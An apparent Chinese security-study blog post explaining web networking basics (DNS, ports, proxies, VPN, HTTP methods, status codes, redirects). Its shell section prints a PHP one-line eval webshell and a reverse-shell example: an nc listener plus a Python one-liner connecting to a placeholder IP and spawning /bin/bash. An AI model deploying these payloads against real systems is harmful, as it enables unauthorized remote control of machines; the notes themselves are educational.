+<h2 id="域名-1"><a href="#域名-1" class="headerlink" title="域名"></a>域名</h2><h3 id="定义-7"><a href="#定义-7" class="headerlink" title="定义"></a>定义</h3><p>域名就是互联网上服务器的“名字”，用于替代难记的IP地址，比如：<a target="_blank" rel="noopener" href="http://www.baidu.com就是一个域名/">www.baidu.com就是一个域名</a></p>
+<h3 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h3><p>由顶级域（TLD，如.com）、二级域（如example）、子域名（如www）组成。</p>
+<h4 id="顶级域"><a href="#顶级域" class="headerlink" title="顶级域"></a>顶级域</h4><p>常见顶级域：.cn、.org、.edu、.net、.gov。顶级域名既可以包含拉丁字母，也可以包含特殊字符。顶级域名最长可以达到63个字符，虽然大多数常见的都是两到三个字符。</p>
+<h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><h3 id="定义-8"><a href="#定义-8" class="headerlink" title="定义"></a>定义</h3><p>DNS是“域名系统”，它像互联网的“电话簿”，负责把人类可读的域名转换为IP地址。</p>
+<h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p>当访问一个URL的时候，浏览器会先询问本地DNS缓存，如果不知道这个域名的IP地址，那么会询问DNS的服务器，DNS服务器会告诉浏览器域名对应的IP地址，然后浏览器使用这个IP地址和服务器简历联系，加载网页。</p>
+<h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><h3 id="定义-9"><a href="#定义-9" class="headerlink" title="定义"></a>定义</h3><p>端口（Port）是计算机上某个具体“应用程序&#x2F;服务”的逻辑门牌号，用来区分同一台设备上不同的网络服务。</p>
+<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><ul>
+<li><strong>知名端口</strong>：0~1023</li>
+<li><strong>注册端口</strong>：1024~49151，可以由用户进程或者应用程序注册使用。</li>
+<li><strong>动态或私有端口</strong>：通常由客户端应用程序动态分配</li>
+</ul>
+<h3 id="端口与服务"><a href="#端口与服务" class="headerlink" title="端口与服务"></a>端口与服务</h3><p>通过IP地址和端口号的组合，网络通信可以准确地将数据包发送到目标服务。这种方式确保了同一台设备上可以同时运行多个网络服务而不会发生冲突。</p>
+<h2 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h2><h3 id="定义-10"><a href="#定义-10" class="headerlink" title="定义"></a>定义</h3><p>路径（Path）是 URL 中用于指定服务器上某个文件、目录或接口逻辑位置的部分，相当于 Web 服务器上的“文件目录结构”或“路由地址”。</p>
+<h2 id="查询参数"><a href="#查询参数" class="headerlink" title="查询参数"></a>查询参数</h2><h3 id="定义-11"><a href="#定义-11" class="headerlink" title="定义"></a>定义</h3><p>查询参数就是 URL 中 <code>?</code> 后面用 <code>key=value</code> 传数据的地方，多个用 <code>&amp;</code> 分开，用来给服务器&#x2F;接口传递额外请求条件。</p>
+<p>例如：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">search</span>=123&amp;lang=zh<br></code></pre></td></tr></table></figure>
+
+<h2 id="片段标识符"><a href="#片段标识符" class="headerlink" title="片段标识符"></a>片段标识符</h2><p>用来定位页面内位置或给前端路由&#x2F;状态使用；它在 <code>#</code> 后面，通常不发送到服务器。</p>
+<h1 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h1><h2 id="代理服务器（Proxy-Server）定义"><a href="#代理服务器（Proxy-Server）定义" class="headerlink" title="代理服务器（Proxy Server）定义"></a>代理服务器（Proxy Server）定义</h2><p>代理服务器是一个位于客户端与目标服务器之间地“中间服务器”，它代表客户端向目标服务器发起请求。用户通过代理服务器转发网络请求和响应。</p>
+<h2 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h2><h3 id="定义-12"><a href="#定义-12" class="headerlink" title="定义"></a>定义</h3><p>正向代理是客户端主动请求代理服务器，代理服务器再请求目标服务器。比如A想访问C，B在中间充当代理设备，不管是哪个方向的流量，B都会将流量的发送者先改成自己，然后再将流量发出去，所以对于C来说，B就是客户端。</p>
+<h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><p>假设我们攻击一台机器，并且这个机器没有防火墙或者没有外部向内部发起连接的限制，此时我们打开这个机器的一个端口，然后用自己的机器主动去连接目标机器，最后我们以这个机器为跳板去访问它内网的其它设备就是正向代理。就是自己的机器是A，把 B 作为<strong>正向代理服务器</strong>，给 B 开一个端口，让 A 去连 B，通过 B <strong>去访问 B 能到达的任何目标（包括外网或 B 所在内网的主机）</strong></p>
+<h2 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h2><h3 id="定义-13"><a href="#定义-13" class="headerlink" title="定义"></a>定义</h3><p>反向代理是被攻击机主动请求代理服务器建立代理。假设我们攻击一台机器，这个机器是存在防火墙或者存在外部向内部发起连接的限制，此时我们就可以再本地开启一个端口去监听，让被攻击机主动请求我们的监听端口，然后我们以这个机器为跳板访问内网其他设备就是反向代理。</p>
+<h3 id="反向代理和正向代理的区别"><a href="#反向代理和正向代理的区别" class="headerlink" title="反向代理和正向代理的区别"></a>反向代理和正向代理的区别</h3><ul>
+<li><p>正向代理：代理客户端，“我”用代理去访问别人</p>
+</li>
+<li><p>反向代理：代理服务端，“别人”访问我时先经过代理</p>
+</li>
+</ul>
+<p>正向代理是“我连代理，代理帮我”；反向代理是“别人连代理，代理帮服务器”。</p>
+<h2 id="VPN"><a href="#VPN" class="headerlink" title="VPN"></a>VPN</h2><p>VPN（Virtual Private Network，虚拟专用网络）就是在公共网络（如互联网）上，通过加密隧道把你的设备“逻辑上接入”到另一个私有网络的技术。</p>
+<h3 id="VPN与代理的对比"><a href="#VPN与代理的对比" class="headerlink" title="VPN与代理的对比"></a>VPN与代理的对比</h3><p>VPN通常会对用户的流量进行端到端的加密，从用户设备到VPN服务器的整个过程都是加密的，提供更高的安全性和隐私保护。代理一般不会加密数据，仅是通过代理服务器中转数据，因此隐私保护和安全性较低。如果需要加密功能，则需要HTTPS或者SOCKS代理，且加密强度对于VPN较低</p>
+<h3 id="VPN性能"><a href="#VPN性能" class="headerlink" title="VPN性能"></a>VPN性能</h3><p>由于VPN加密数据并覆盖所有流量，因此对带宽和性能的要求都比较高，可能会造成一定的延迟，有七千是在加密协议较强或者网络状况不好的情况下。代理的性能一般会比VPN的高一些，因为它不加密数据且只作用与特定的应用，因此在带宽消耗和延迟上表现较好。</p>
+<h2 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h2><p>内容分发网络是指一种透过互联网互相连接的电脑网络系统，利用最靠近每位用户的服务器，更快、更可靠地将音乐、图片、影片、应用程序及其他文件发送给用户，来提供高性能、可扩展性及低成本的网络内容传递给用户。</p>
+<p>当你访问一个网站时，如果没有 CDN，所有请求都会发送到网站的源服务器（源站）； 而使用 CDN 后，你会优先访问离你最近的 CDN 节点，获取网页、图片、视频等内容。</p>
+<h1 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h1><h2 id="定义-14"><a href="#定义-14" class="headerlink" title="定义"></a>定义</h2><p>Shell 既是一种命令语言，又是一种程序设计语言，在中文中解释“外壳”的意思，就是操作系统的外壳。工作中我们通过shell命令来操作和控制操作系统，在Linux操作系统中的Shell命令就包括touch、cd、pwd、mkdir等等。总结来说，Shell是一个命令解释器，用户输入命令时，shell解释器负责将命令解释给内核，内核对程序的运行或对计算机进行控制，最后处理完后将结果反馈给用户。</p>
+<p>shell script 脚本就是由Shell命令组成的文件，这些命令都是可执行程序的名字，脚本不用编译即可运行。它通过解释器解释运行，因此速度相对来说就比较慢。</p>
+<p>比较常用的命令有cat（查看文件内容） mv（移动&#x2F;重命名文件） mkdir（创建目录） rm（删除文件&#x2F;目录） cd（切换目录） touch（创建空文件 &#x2F; 更新时间戳） pwd（显示当前所在目录）ls（查看目录）等等</p>
+<h2 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h2><p>渗透测试工作的一个阶段性目标就是<strong>获取目标服务器的操作控制权限</strong>，于是WebShell便应运而生。Webshell中的 WEB 就是web服务，shell就是管理攻击者与操作系统之间的交互。Webshell被称为攻击者通过Web服务器端口对 Web 服务器有一定的操作权限，而webshell常以网页脚本的形式出现。常见的WebShell使用asp、jsp和php来编写，提供了如执行系统命令、文件上传下载、数据库管理等功能。webshell管理工具有蚁剑，冰蝎，哥斯拉。你们所知的一句话木马就是一个最简单的webshell：<code>&lt;?php @eval($_POST[&#39;webshell&#39;]);?</code>获取webshell的动作又叫做getshell</p>
+<blockquote>
+<p>eval会把传入的<strong>字符串当成 PHP 代码执行</strong></p>
+</blockquote>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，即为反向连接。</p>
+<p>反弹shell（Reverse Shell）是一种常见的攻击方式，通常用于远程控制目标系统。它与传统的“反向连接”（Reverse Connection）相似，通过允许目标系统主动连接回攻击者的机器，从而绕过防火墙或NAT（网络地址转换）等网络安全措施。</p>
+<p>反弹 shell 是一种网络攻击技术，它允许攻击者在远程目标机器上执行一个命令，使得目标机器主动向攻击者的机器发起网络连接，将一个命令行 shell（如 bash、cmd 等）提供给攻击者，从而让攻击者能够控制目标机器的 shell，就好像直接在目标机器上操作一样。</p>
+<h3 id="常见情景"><a href="#常见情景" class="headerlink" title="常见情景"></a>常见情景</h3><p>反弹shell通常适用于如下几种情况：</p>
+<ul>
+<li><p>目标机因防火墙受限，目标机器只能发送请求，不能接收请求。</p>
+</li>
+<li><p>目标机端口被占用。</p>
+</li>
+<li><p>目标机位于局域网，或IP会动态变化，攻击机无法直接连接。</p>
+</li>
+<li><p>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知的。</p>
+</li>
+<li><p>执行命令无回显</p>
+</li>
+</ul>
+<h3 id="反弹shell示例（利用服务器控制kali）"><a href="#反弹shell示例（利用服务器控制kali）" class="headerlink" title="反弹shell示例（利用服务器控制kali）"></a>反弹shell示例（利用服务器控制kali）</h3><p>在服务器上监听一个端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 2333<br></code></pre></td></tr></table></figure>
+
+<p>在kali上利用bash指令去强行访问监听的这个端口</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python3 -c <span class="hljs-string">&#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;ip&quot;,2333));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/08/25/Web%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20260826153731218.png" srcset="/img/loading.gif" lazyload alt="image-20260826153731218"></p>
+<h1 id="远程连接协议"><a href="#远程连接协议" class="headerlink" title="远程连接协议"></a>远程连接协议</h1><p>远程连接协议有：telnet、ssh、ftp，都用于在一台电脑上远程操作另一台电脑或者传输数据</p>
+<p><img src="/2026/08/25/Web%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20260826145548435.png" srcset="/img/loading.gif" lazyload alt="image-20260826145548435"></p>
+<h2 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h2><ul>
+<li>功能：远程登录服务器，执行命令（不加密）</li>
+<li>安全性：极低、明文传输</li>
+<li>端口号：默认为23</li>
+<li>命令示例：<code>telnet 192.168.1.1 23</code>，如果目标 <code>192.168.1.1</code> 的 TCP 23 端口开放且运行着 Telnet 服务，终端会进入 Telnet 交互界面，紧接着出现类似login的提示，要求你输入用户名和密码</li>
+</ul>
+<h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><ul>
+<li>功能：远程安全登录 + 命令行控制 + 端口转发 + 文件传输（scp&#x2F;sftp）</li>
+<li>安全性：非常高，默认加密通信</li>
+<li>端口号：默认 22</li>
+<li>支持密码登录或公钥登录</li>
+<li>可通过 sftp、scp 进行安全文件传输</li>
+<li>示例命令：ssh <a href="mailto:&#x75;&#x73;&#101;&#114;&#x40;&#x31;&#57;&#50;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#49;&#46;&#49;">&#x75;&#x73;&#101;&#114;&#x40;&#x31;&#57;&#50;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#49;&#46;&#49;</a></li>
+</ul>
+<h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><ul>
+<li><strong>功能：</strong>远程文件上传、下载</li>
+<li><strong>安全性：</strong>普遍 FTP 是明文传输，存在安全隐患</li>
+<li><strong>端口号：</strong>默认 21</li>
+<li>支持目录浏览、断点续传</li>
+<li><strong>示例命令：</strong>ftp 192.168.1.1</li>
+</ul>
+<h2 id="三者对比总结表"><a href="#三者对比总结表" class="headerlink" title="三者对比总结表"></a>三者对比总结表</h2><table>
+<thead>
+<tr>
+<th align="center">对比项</th>
+<th align="center">Telnet</th>
+<th align="center">SSH</th>
+<th align="center">FTP</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">主要用途</td>
+<td align="center">远程控制终端</td>
+<td align="center">安全远程控制终端</td>
+<td align="center">文件传输</td>
+</tr>
+<tr>
+<td align="center">是否加密</td>
+<td align="center">不加密</td>
+<td align="center">全程加密</td>
+<td align="center">普通FTP不加密</td>
+</tr>
+<tr>
+<td align="center">默认端口</td>
+<td align="center">23</td>
+<td align="center">22</td>
+<td align="center">21</td>
+</tr>
+<tr>
+<td align="center">是否安全</td>
+<td align="center">非常不安全</td>
+<td align="center">安全性高</td>
+<td align="center">普通FTP不安全（建议使用<code>SFTP</code>&#x2F;<code>FTPS</code>）</td>
+</tr>
+<tr>
+<td align="center">文件传输</td>
+<td align="center">不支持</td>
+<td align="center">支持</td>
+<td align="center">支持</td>
+</tr>
+<tr>
+<td align="center">常用工具</td>
+<td align="center">telnet命令行</td>
+<td align="center">ssh、putty、<code>Xshell</code>等</td>
+<td align="center"><code>FileZilla</code>、<code>Lftp</code>等</td>
+</tr>
+</tbody></table>
+<h1 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h1><p>在网络请求（比如用户通过浏览器访问资源、CDN 节点从源站拉取内容等场景）中，“请求方法” 指的是客户端（如浏览器、CDN 节点）向服务器发送请求时，表明 “操作意图” 的标准指令。</p>
+<table>
+<thead>
+<tr>
+<th align="center"><strong>序号</strong></th>
+<th align="left"><strong>方法</strong></th>
+<th align="left"><strong>描述</strong></th>
+<th>特点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">1</td>
+<td align="left">GET</td>
+<td align="left">从服务器获取资源。用于请求数据而不对数据进行更改。例如，从服务器获取网页、图片等。</td>
+<td>参数在 URL 里，会被日志记录；一句话木马常用 <code>$_GET</code> 或 <code>$_POST</code> 接收命令</td>
+</tr>
+<tr>
+<td align="center">2</td>
+<td align="left">POST</td>
+<td align="left">向服务器发送数据以创建新资源。常用于提交表单数据或上传文件。发送的数据包含在请求体中。</td>
+<td>请求体传参，蚁剑&#x2F;菜刀默认用 POST；比 GET 隐蔽，但仍可被 WAF&#x2F;流量分析捕获</td>
+</tr>
+<tr>
+<td align="center">3</td>
+<td align="left">PUT</td>
+<td align="left">向服务器发送数据以更新现有资源。如果资源不存在，则创建新的资源。与 POST 不同，PUT 通常是幂等的，即多次执行相同的 PUT 请求不会产生不同的结果。</td>
+<td>RESTful API 常见，未授权访问可导致任意文件上传&#x2F;删除（WebDAV 漏洞经典场景）</td>
+</tr>
+<tr>
+<td align="center">4</td>
+<td align="left">DELETE</td>
+<td align="left">从服务器删除指定的资源。请求中包含要删除的资源标识符。</td>
+<td>RESTful API 常见，未授权访问可导致任意文件上传&#x2F;删除（WebDAV 漏洞经典场景）</td>
+</tr>
+<tr>
+<td align="center">5</td>
+<td align="left">PATCH</td>
+<td align="left">对资源进行部分修改。与 PUT 类似，但 PATCH 只更改部分数据而不是替换整个资源。</td>
+<td>RESTful API 常见，未授权访问可导致任意文件上传&#x2F;删除（WebDAV 漏洞经典场景）</td>
+</tr>
+<tr>
+<td align="center">6</td>
+<td align="left">HEAD</td>
+<td align="left">类似于 GET，但服务器只返回响应的头部，不返回实际数据。用于检查资源的元数据（例如，检查资源是否存在，查看响应的头部信息）。</td>
+<td>信息探测，轻量级资产指纹识别</td>
+</tr>
+<tr>
+<td align="center">7</td>
+<td align="left">OPTIONS</td>
+<td align="left">返回服务器支持的 HTTP 方法。用于检查服务器支持哪些请求方法，通常用于跨域资源共享（CORS）的预检请求。</td>
+<td>看服务器”开放了哪些动作”，暴露攻击面；CORS 预检可测跨域策略宽松度</td>
+</tr>
+<tr>
+<td align="center">8</td>
+<td align="left">TRACE</td>
+<td align="left">回显服务器收到的请求，主要用于诊断。客户端可以查看请求在服务器中的处理路径。</td>
+<td>开启后有 XST（跨站追踪）风险，可劫持 Cookie；生产环境应禁用</td>
+</tr>
+<tr>
+<td align="center">9</td>
+<td align="left">CONNECT</td>
+<td align="left">建立一个到服务器的隧道，通常用于 HTTPS 连接。客户端可以通过该隧道发送加密的数据。</td>
+<td>HTTP 代理隧道基础，可穿防火墙；也是 HTTPS 透传机制，流量加密后 IDS 难识别内容</td>
+</tr>
+</tbody></table>
+<h1 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h1><table>
+<thead>
+<tr>
+<th align="center"><strong>状态码范围</strong></th>
+<th align="left"><strong>分类名</strong></th>
+<th align="left"><strong>说明</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">1xx</td>
+<td align="left">信息响应</td>
+<td align="left">请求已接收，继续处理</td>
+</tr>
+<tr>
+<td align="center">2xx</td>
+<td align="left">成功响应</td>
+<td align="left">请求成功</td>
+</tr>
+<tr>
+<td align="center">3xx</td>
+<td align="left">重定向响应</td>
+<td align="left">需要进一步操作，如跳转</td>
+</tr>
+<tr>
+<td align="center">4xx</td>
+<td align="left">客户端错误</td>
+<td align="left">请求有问题（URL 错误、权限不足）</td>
+</tr>
+<tr>
+<td align="center">5xx</td>
+<td align="left">服务器错误</td>
+<td align="left">服务器自身出错</td>
+</tr>
+</tbody></table>
+<h2 id="2xx-成功"><a href="#2xx-成功" class="headerlink" title="2xx 成功"></a>2xx 成功</h2><table>
+<thead>
+<tr>
+<th align="center"><strong>状态码</strong></th>
+<th align="left"><strong>含义</strong></th>
+<th align="left"><strong>说明</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">200</td>
+<td align="left">OK</td>
+<td align="left">请求成功并返回数据</td>
+</tr>
+<tr>
+<td align="center">201</td>
+<td align="left">Created</td>
+<td align="left">请求成功，资源已创建（常用于 POST）</td>
+</tr>
+<tr>
+<td align="center">204</td>
+<td align="left">No Content</td>
+<td align="left">请求成功，但无返回内容</td>
+</tr>
+</tbody></table>
+<h2 id="3xx-重定向"><a href="#3xx-重定向" class="headerlink" title="3xx 重定向"></a>3xx 重定向</h2><table>
+<thead>
+<tr>
+<th align="center"><strong>状态码</strong></th>
+<th align="left"><strong>含义</strong></th>
+<th align="left"><strong>说明</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">301</td>
+<td align="left">永久重定向</td>
+<td align="left">资源永久搬家（浏览器会记住）</td>
+</tr>
+<tr>
+<td align="center">302</td>
+<td align="left">临时重定向</td>
+<td align="left">资源临时搬家（不会缓存）</td>
+</tr>
+<tr>
+<td align="center">304</td>
+<td align="left">Not Modified</td>
+<td align="left">资源未改变，使用缓存</td>
+</tr>
+</tbody></table>
+<h2 id="4xx-客户端错误"><a href="#4xx-客户端错误" class="headerlink" title="4xx 客户端错误"></a>4xx 客户端错误</h2><table>
+<thead>
+<tr>
+<th align="center">状态码</th>
+<th>含义</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">400</td>
+<td>Bad Request</td>
+<td>请求格式错误</td>
+</tr>
+<tr>
+<td align="center">401</td>
+<td>Unauthorized</td>
+<td>未授权（如需要登录）</td>
+</tr>
+<tr>
+<td align="center">403</td>
+<td>Forbidden</td>
+<td>拒绝访问（权限不足）</td>
+</tr>
+<tr>
+<td align="center">404</td>
+<td>Not Found</td>
+<td>请求的资源不存在</td>
+</tr>
+<tr>
+<td align="center">405</td>
+<td>Method Not Allowed</td>
+<td>请求方法不被允许（如用GET访问只能POST的接口）</td>
+</tr>
+</tbody></table>
+<h2 id="5xx-服务器错误"><a href="#5xx-服务器错误" class="headerlink" title="5xx 服务器错误"></a>5xx 服务器错误</h2><table>
+<thead>
+<tr>
+<th align="center">状态码</th>
+<th>含义</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">500</td>
+<td>Internal Server Error</td>
+<td>服务器内部出错</td>
+</tr>
+<tr>
+<td align="center">502</td>
+<td>Bad Gateway</td>
+<td>网关错误（比如 CDN 访问源站失败）</td>
+</tr>
+<tr>
+<td align="center">503</td>
+<td>Service Unavailable</td>
+<td>服务不可用（服务器可能过载或维护）</td>
+</tr>
+<tr>
+<td align="center">504</td>
+<td>Gateway Timeout</td>
+<td>网关超时（常见于反向代理）</td>
+</tr>
+</tbody></table>
+<h1 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h1><h2 id="定义-15"><a href="#定义-15" class="headerlink" title="定义"></a>定义</h2><p>重定向是一种网络技术，它将用户从一个 URL 自动引导到另一个 URL 的过程。当用户请求访问一个网页或资源时，服务器会向用户的浏览器发送一个特殊的响应，指示浏览器跳转到另一个地址。</p>
+<p><strong>举例理解</strong></p>
+<p>想象一下，你要去一家商店（这就好比你在浏览器中输入一个网址，想要访问一个网页），但是当你到达原来商店的地址时，发现商店已经搬到另一个地方啦 不过别担心，商店老板在原来的地址贴了一张纸条（服务器发回的信息），告诉你新的商店位置在哪里。于是，你就根据纸条上的信息，去到了新的商店地址（浏览器根据服务器的信息，自动跳转到新的网址），这个过程就是重定向。</p>
+<h2 id="分类-1"><a href="#分类-1" class="headerlink" title="分类"></a>分类</h2><h3 id="永久重定向"><a href="#永久重定向" class="headerlink" title="永久重定向"></a>永久重定向</h3><p>301 永久重定向是服务端通过 <code>Location</code> 头宣告资源归属发生不可逆变更的强信令机制，客户端及 CDN 会据此长期缓存跳转关系。</p>
+<p><strong>举例理解</strong></p>
+<p>商店老板决定以后都在新的地址营业啦，而且以后不管谁来原来的地址，都会看到那张纸条，让大家都去新地址。这就是 “永久重定向”，像你经常看到的一些网站页面，它可能更新了网址，然后把旧网址永久重定向到新网址，这样你下次访问旧网址时，会直接跳到新网址，就不用再看那张纸条啦。</p>
+<h3 id="临时重定向"><a href="#临时重定向" class="headerlink" title="临时重定向"></a>临时重定向</h3><p>302 临时重定向仅表示资源位置发生短暂变更，客户端严禁缓存跳转关系，每次访问必须重新向原服务器发起请求。</p>
+<p><strong>举例理解</strong></p>
+<p>商店可能是因为装修或者其他临时的原因暂时搬到新地址，等过一段时间可能还会搬回来。这时候老板也会贴一张纸条告诉你新地址，但可能过一段时间你再去原来的地址，就不会看到纸条啦，因为商店又搬回去了。这就是 “临时重定向”，比如网站因为维护暂时把页面放到了另一个地址，等维护结束，你可能又可以直接访问原来的地址，而不用再被重定向啦。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>一些WEB网络基础的概念差不多就这些了，之后有想到会继续补充。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="category-chain-item">漏洞学习笔记</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Web%E5%9F%BA%E7%A1%80/" class="category-chain-item">Web基础</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Web%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="print-no-link">#Web基础知识</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Web网络基础</div>
+      <div>https://colourful228.github.io/2026/08/25/Web网络基础/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Colourful</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年8月25日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2026年8月26日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/07/08/Java%E5%8F%8D%E5%B0%84/" title="Java反射">
+                        <span class="hidden-mobile">Java反射</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+    <div id="giscus" class="giscus"></div>
+    <script type="text/javascript">
+      Fluid.utils.loadComments('#giscus', function() {
+        var options = {"repo":"Colourful228/Blog_Disscussion","repo-id":"R_kgDOS4dBxQ","category":"Announcements","category-id":"DIC_kwDOS4dBxc4C_AjU","theme-light":"light","theme-dark":"dark","mapping":"pathname","reactions-enabled":1,"emit-metadata":0,"input-position":"bottom","lang":"zh-CN"};
+        var attributes = {};
+        for (let option in options) {
+          if (!option.startsWith('theme-')) {
+            var key = option.startsWith('data-') ? option : 'data-' + option;
+            attributes[key] = options[option];
+          }
+        }
+        var light = 'light';
+        var dark = 'dark';
+        window.GiscusThemeLight = light;
+        window.GiscusThemeDark = dark;
+        attributes['data-theme'] = document.documentElement.getAttribute('data-user-color-scheme') === 'dark' ? dark : light;
+        for (let attribute in attributes) {
+          var value = attributes[attribute];
+          if (value === undefined || value === null || value === '') {
+            delete attributes[attribute];
+          }
+        }
+        var s = document.createElement('script');
+        s.setAttribute('src', 'https://giscus.app/client.js');
+        s.setAttribute('crossorigin', 'anonymous');
+        for (let attribute in attributes) {
+          s.setAttribute(attribute, attributes[attribute]);
+        }
+        var ss = document.getElementsByTagName('script');
+        var e = ss.length > 0 ? ss[ss.length - 1] : document.head || document.documentElement;
+        e.parentNode.insertBefore(s, e.nextSibling);
+      });
+    </script>
+    <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+    <div>
+        <span id="timeDate">正在载入天数...</span>
+        <span id="times">载入时分秒...</span>
+        <script>
+          var now = new Date();
+          function createtime(){
+            var grt= new Date("01/09/2026 00:00:00");
+            now.setTime(now.getTime()+250);
+            days = (now - grt ) / 1000 / 60 / 60 / 24;
+            dnum = Math.floor(days);
+            hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
+            hnum = Math.floor(hours);
+            if(String(hnum).length ==1 ){
+              hnum = "0" + hnum;
+            }
+            minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+            mnum = Math.floor(minutes);
+            if(String(mnum).length ==1 ){
+              mnum = "0" + mnum;
+            }
+            seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
